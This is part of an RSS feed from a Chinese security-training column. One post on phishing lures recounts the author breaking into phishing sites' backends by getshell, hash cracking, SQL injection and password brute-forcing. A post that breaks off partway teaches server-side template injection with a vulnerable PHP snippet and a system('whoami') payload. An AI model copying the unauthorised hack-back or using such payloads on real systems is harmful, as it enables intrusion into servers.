href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;twosecurity.cn/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;你们千万不要点哦，因为里面可能有各种优惠、技能包什么的，别点进去哈（点了我们可就吃大亏了）！！！别点，别点，别点（重要的事情说三遍）&lt;/p&gt;&lt;p&gt;✨✨✨✨✨✨✨✨✨✨✨✨&lt;b&gt;假装这是分隔符&lt;/b&gt;✨✨✨✨✨✨✨✨✨✨✨✨&lt;/p&gt;&lt;p&gt;有多少好奇宝宝点进去了呢？让我们来数数。。。&lt;/p&gt;&lt;h2&gt;钓鱼事故集合💢&lt;/h2&gt;&lt;p&gt;所以呢，有些东西表面上是看不出什么破绽的，就好比下面这个&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-7085cb347d3b82f907428165f661f457_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;924&quot; data-rawheight=&quot;1920&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;924&quot; data-original=&quot;https://pic4.zhimg.com/v2-7085cb347d3b82f907428165f661f457_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-7085cb347d3b82f907428165f661f457_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;924&quot; data-rawheight=&quot;1920&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;924&quot; data-original=&quot;https://pic4.zhimg.com/v2-7085cb347d3b82f907428165f661f457_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-7085cb347d3b82f907428165f661f457_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;oh my god~&lt;/p&gt;&lt;p&gt;&lt;b&gt;橙子M416武器套装&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;粉红兔子套装&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;改名卡&lt;/b&gt;&lt;/p&gt;&lt;p&gt;我的天，这么多好东西，赚大发了，赶快点进去领。。。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-66bcb36175986ef351cb1a671882d1fd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;250&quot; data-rawheight=&quot;250&quot; class=&quot;content_image&quot; width=&quot;250&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-66bcb36175986ef351cb1a671882d1fd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;250&quot; data-rawheight=&quot;250&quot; class=&quot;content_image lazy&quot; width=&quot;250&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-66bcb36175986ef351cb1a671882d1fd_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;在电脑端，不小心按了 Ctrl+A （好吧，就是故意按的），看看这个钓鱼邮件为了绕过检测有多么奇葩吧~&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0a461bc73dfe7cb2c4473e4122eb5843_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;461&quot; data-rawheight=&quot;769&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;461&quot; data-original=&quot;https://pic4.zhimg.com/v2-0a461bc73dfe7cb2c4473e4122eb5843_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0a461bc73dfe7cb2c4473e4122eb5843_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;461&quot; data-rawheight=&quot;769&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;461&quot; data-original=&quot;https://pic4.zhimg.com/v2-0a461bc73dfe7cb2c4473e4122eb5843_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-0a461bc73dfe7cb2c4473e4122eb5843_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;表示看不懂，&lt;b&gt;我才不会点呢！！！&lt;/b&gt;并且反手就要搞你。。。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6d52ae79abce4f66b2dc6fa0e9f6f62a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;446&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1080&quot; data-original=&quot;https://pic3.zhimg.com/v2-6d52ae79abce4f66b2dc6fa0e9f6f62a_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6d52ae79abce4f66b2dc6fa0e9f6f62a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;446&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1080&quot; data-original=&quot;https://pic3.zhimg.com/v2-6d52ae79abce4f66b2dc6fa0e9f6f62a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-6d52ae79abce4f66b2dc6fa0e9f6f62a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;一个专门搞黑东西（你懂的）的网站，业务齐全，在我手里你能活下去？&lt;/p&gt;&lt;p&gt;盲猜了几个目录，来看看robots.txt&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f5b9b606ef82e20822a646678e4085f2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;499&quot; data-rawheight=&quot;215&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;499&quot; data-original=&quot;https://pic3.zhimg.com/v2-f5b9b606ef82e20822a646678e4085f2_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f5b9b606ef82e20822a646678e4085f2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;499&quot; data-rawheight=&quot;215&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;499&quot; data-original=&quot;https://pic3.zhimg.com/v2-f5b9b606ef82e20822a646678e4085f2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-f5b9b606ef82e20822a646678e4085f2_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;得到关键信息 XiaoCms，下载了一套并进行登录处的代码审计，发现并没有甜头。&lt;/p&gt;&lt;p&gt;后面又尝试了其他方法，通过一个 PHPstudy 漏洞成功 getshell （当然我们并没有做什么），然后就提交给相关部门处理了。&lt;/p&gt;&lt;p&gt;&lt;b&gt;抬走，下一个。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Steam 的钓鱼邮件都还不算什么，下面这个就有点欠揍了。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1e2cd7f2a47bef5d1862d5985c72479b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;641&quot; data-rawheight=&quot;213&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;641&quot; data-original=&quot;https://pic4.zhimg.com/v2-1e2cd7f2a47bef5d1862d5985c72479b_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1e2cd7f2a47bef5d1862d5985c72479b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;641&quot; data-rawheight=&quot;213&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;641&quot; data-original=&quot;https://pic4.zhimg.com/v2-1e2cd7f2a47bef5d1862d5985c72479b_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-1e2cd7f2a47bef5d1862d5985c72479b_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;（图片都坏了，一点都不专业！）&lt;/p&gt;&lt;p&gt;罢了罢了，毕竟好不容易有个情侣嘛（我好像暴露了啥）&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-be4cabaa02d784a976477f79e92bfb7f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;200&quot; data-rawheight=&quot;200&quot; class=&quot;content_image&quot; width=&quot;200&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-be4cabaa02d784a976477f79e92bfb7f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;200&quot; data-rawheight=&quot;200&quot; class=&quot;content_image lazy&quot; width=&quot;200&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-be4cabaa02d784a976477f79e92bfb7f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;让我们小心的点进去看看。。。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f6438de1c57984b32ed50b73b1ec78db_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1918&quot; data-rawheight=&quot;939&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1918&quot; data-original=&quot;https://pic4.zhimg.com/v2-f6438de1c57984b32ed50b73b1ec78db_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f6438de1c57984b32ed50b73b1ec78db_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1918&quot; data-rawheight=&quot;939&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1918&quot; data-original=&quot;https://pic4.zhimg.com/v2-f6438de1c57984b32ed50b73b1ec78db_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-f6438de1c57984b32ed50b73b1ec78db_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;果然，又是一个钓鱼网站，页面还做的挺像的（美中不足的是我点登录框右上角的❌关不掉？？？强制登录？）&lt;/p&gt;&lt;p&gt;扫了一波后台，是宝塔面板，带waf的，难搞。。。&lt;/p&gt;&lt;p&gt;不过，还是被爆出来了，得到管理员帐号和它的 MD5&lt;/p&gt;&lt;p&gt;MD5 破解后登录后台：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ebad830e90da70c28c5aaaddb2067c5e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;247&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;554&quot; data-original=&quot;https://pic3.zhimg.com/v2-ebad830e90da70c28c5aaaddb2067c5e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ebad830e90da70c28c5aaaddb2067c5e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;247&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;554&quot; data-original=&quot;https://pic3.zhimg.com/v2-ebad830e90da70c28c5aaaddb2067c5e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-ebad830e90da70c28c5aaaddb2067c5e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;还有一个，也是前段时间，LOL S9的时候，我收到了这样的邮件。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5306e5db95c73bc5c5ef1bdf89f6b3f0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;639&quot; data-rawheight=&quot;209&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;639&quot; data-original=&quot;https://pic1.zhimg.com/v2-5306e5db95c73bc5c5ef1bdf89f6b3f0_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5306e5db95c73bc5c5ef1bdf89f6b3f0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;639&quot; data-rawheight=&quot;209&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;639&quot; data-original=&quot;https://pic1.zhimg.com/v2-5306e5db95c73bc5c5ef1bdf89f6b3f0_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-5306e5db95c73bc5c5ef1bdf89f6b3f0_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;幸运折扣？立马我就点了进去，毕竟不是每个人都是幸运召唤师嘛（毕竟不是每个人都长我这样容易骗嘛）&lt;/p&gt;&lt;p&gt;然后我就真的点了进去&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-df4461d04595b965083ca0f6bd04031a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1920&quot; data-rawheight=&quot;1048&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1920&quot; data-original=&quot;https://pic3.zhimg.com/v2-df4461d04595b965083ca0f6bd04031a_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-df4461d04595b965083ca0f6bd04031a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1920&quot; data-rawheight=&quot;1048&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1920&quot; data-original=&quot;https://pic3.zhimg.com/v2-df4461d04595b965083ca0f6bd04031a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-df4461d04595b965083ca0f6bd04031a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;我差点就信了（除了网址，其他的做得真的好，登录框会延迟五秒弹出，并且点上面的按钮会跳转到相应的正确页面），还好瞟了一眼url。。。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8099daa79f5b75f62c99cd8c4ac986c9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;620&quot; data-rawheight=&quot;620&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;620&quot; data-original=&quot;https://pic2.zhimg.com/v2-8099daa79f5b75f62c99cd8c4ac986c9_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8099daa79f5b75f62c99cd8c4ac986c9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;620&quot; data-rawheight=&quot;620&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;620&quot; data-original=&quot;https://pic2.zhimg.com/v2-8099daa79f5b75f62c99cd8c4ac986c9_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-8099daa79f5b75f62c99cd8c4ac986c9_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;然后我们进行扫描一把梭，得到了它的后台地址&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3ccd38f3ad22e474cbf0920363ee9df5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;949&quot; data-rawheight=&quot;485&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;949&quot; data-original=&quot;https://pic2.zhimg.com/v2-3ccd38f3ad22e474cbf0920363ee9df5_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3ccd38f3ad22e474cbf0920363ee9df5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;949&quot; data-rawheight=&quot;485&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;949&quot; data-original=&quot;https://pic2.zhimg.com/v2-3ccd38f3ad22e474cbf0920363ee9df5_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-3ccd38f3ad22e474cbf0920363ee9df5_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;后台长这样的，就是很常见的这种&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2fba3d69c005d567b314e7c31282800a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;850&quot; data-rawheight=&quot;640&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;850&quot; data-original=&quot;https://pic3.zhimg.com/v2-2fba3d69c005d567b314e7c31282800a_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2fba3d69c005d567b314e7c31282800a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;850&quot; data-rawheight=&quot;640&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;850&quot; data-original=&quot;https://pic3.zhimg.com/v2-2fba3d69c005d567b314e7c31282800a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-2fba3d69c005d567b314e7c31282800a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;先试了试 XSS，无果，然后用 SQL 注出了它的绝对路径&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-15365fc6099b3f1a57809b87e051971f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;451&quot; data-rawheight=&quot;153&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;451&quot; data-original=&quot;https://pic4.zhimg.com/v2-15365fc6099b3f1a57809b87e051971f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-15365fc6099b3f1a57809b87e051971f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;451&quot; data-rawheight=&quot;153&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;451&quot; data-original=&quot;https://pic4.zhimg.com/v2-15365fc6099b3f1a57809b87e051971f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-15365fc6099b3f1a57809b87e051971f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;只能跑密码了，然后成功进了后台~&lt;/p&gt;&lt;p&gt;好了好了，没有那么多钓鱼的了，毕竟都在钓我（我能怎么办，我也很无赖）&lt;/p&gt;&lt;p&gt;当然，还有下面这种“钓鱼”的（我真的是什么都遇得到，我长得很好骗吗？）&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ff73e69a1b26ef9889647b790004dd61_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;2340&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1080&quot; data-original=&quot;https://pic2.zhimg.com/v2-ff73e69a1b26ef9889647b790004dd61_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ff73e69a1b26ef9889647b790004dd61_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;2340&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1080&quot; data-original=&quot;https://pic2.zhimg.com/v2-ff73e69a1b26ef9889647b790004dd61_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-ff73e69a1b26ef9889647b790004dd61_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;所以， 在最后，为了更好地保护大家免受骗子的侵害，尤其是在最近黑五、圣诞、元旦跨年之际，我们给大家提供了一些建议：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;验证你想访问的任何网站的URL，网络钓鱼通常会模仿合法的网站，以便显得更可信，“火眼金睛”看清楚吧。&lt;/li&gt;&lt;li&gt;在网站上进行互动时，请特别小心，尤其是在要求提供敏感的个人信息时。如果不小心输入了帐号密码，请立即退出并修改帐号和密码，毕竟它只是存了你的帐号密码，可能还没修改或者改密。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;为此，我们打算推出一个防诈骗练习平台，里面有很多网站，你必须找出里面的钓鱼网站才能顺利进入第二关（当然，只是我的打算，敬请期待~）。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;有关 &lt;b&gt;网络钓鱼&lt;/b&gt; 的内容就简单介绍到这里。更多有关内容请前往 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt; 进行学习，最近推出了一系列免费的网络安全技能包，有关CTF、渗透测试、网络攻防、黑客技巧尽在其中，学它涨姿势💯。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2019-11-27-93962838</guid>
<pubDate>Wed, 27 Nov 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-11-26-93746437.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/93746437&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d1286023a6e059327ac8e1eca76280bd_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;SSTI（模板注入）&lt;/h2&gt;&lt;p&gt;首先，我们先搞清楚什么是模版引擎（SST）。&lt;/p&gt;&lt;blockquote&gt;模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。   &lt;/blockquote&gt;&lt;p&gt;一个空白的 html 页面只有变量，访问这个页面时需要将这些变量转换成预期的内容，这时候就需要用到模板引擎。php（或者其他脚本语言）代码通过访问模板引擎，模板引擎通过正则匹配产生一个新的缓存的 html 页面，从而实现 php 和 html 代码的分离。&lt;/p&gt;&lt;p&gt;&lt;b&gt;简而言之，就是一个购物清单，将上面的一个一个商品名换成对应的商品放在购物车里。&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c090833ffb673f5de0a1d743b5c596e6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1000&quot; data-rawheight=&quot;952&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1000&quot; data-original=&quot;https://pic3.zhimg.com/v2-c090833ffb673f5de0a1d743b5c596e6_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c090833ffb673f5de0a1d743b5c596e6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1000&quot; data-rawheight=&quot;952&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1000&quot; data-original=&quot;https://pic3.zhimg.com/v2-c090833ffb673f5de0a1d743b5c596e6_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-c090833ffb673f5de0a1d743b5c596e6_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;模板引擎的作用&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如果在一个页面中 php 代码与 html 代码混合在一起，在很多时候都会造成不便，用模板引擎可以让 php 代码和 html 代码进行分离。&lt;/p&gt;&lt;p&gt;&lt;b&gt;为什么模板引擎是危险的？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;SST 表面上看起来并没有什么危害，但是如果你仔细研究的话，会发现它能在模板中执行本机函数，这就意味着如果攻击者能够向模板文件中写入这种表达式，他们就能够执行任意函数。&lt;/p&gt;&lt;p&gt;那 require() 和 eval() 函数来说，require() 函数会包含一个文件并执行，eval() 函数不是执行文件，而是将字符串当成代码来执行。&lt;/p&gt;&lt;p&gt;将未经处理的输入传递给 eval() 函数是极其危险的，你们的编程老师应该都跟你们反复提到过。但是当涉及到处理模板引擎时，很多人就忽略了这一点。所以，有时候你看到的代码会是下面这样的：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;$templateEngine = new TemplateEngine();
$template = $templateEngine-&amp;gt;loadString(&amp;#39;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;{{method}}&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#34;&amp;#39;. $_SERVER[&amp;#39;PHP_SELF&amp;#39;] . &amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;[...]&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&amp;#39;);
$template-&amp;gt;assign(&amp;#39;method&amp;#39;,&amp;#39;POST&amp;#39;);
$template-&amp;gt;show();&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这段代码显示，在模板中，有一处输入是用户可控的，这就意味着用户可以执行模板表达式。&lt;/p&gt;&lt;p&gt;举个例子，恶意的表达式可能非常简单，比如 [[system(‘whoami’)]]，这样会执行系统命令 whoami。因此模板注入很容易导致远程代码执行（RCE），就像未经过处理的输入直接传递为 eval() 函数一样。&lt;/p&gt;&lt;blockquote&gt;SST 信任了用户的输入，并且执行这些内容，包括执行本机函数。就像 eval 函数对传入的内容未加任何过滤一样。因此模板注入很容易导致远程代码执行（RCE）、信息泄露等漏洞。&lt;/blockquote&gt;&lt;p&gt;这就是我们所说的服务器端模板注入（SSTI），上面这个例子可能比较傻，但在实际中，漏洞会非常隐蔽、难以发现。比如将许多不同的组件连接在一起传递为模板引擎，但是忽视了其中的某些组件可能包含用户可控的输入等等。&lt;/p&gt;&lt;p&gt;&lt;b&gt;注入原理&lt;/b&gt;&lt;/p&gt;&lt;p&gt;使用 Twig 模版引擎渲染页面，其中模版含有 {{name}} 变量，其模版变量值来自于 GET 请求参数 $_GET[&amp;#34;name&amp;#34;]。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
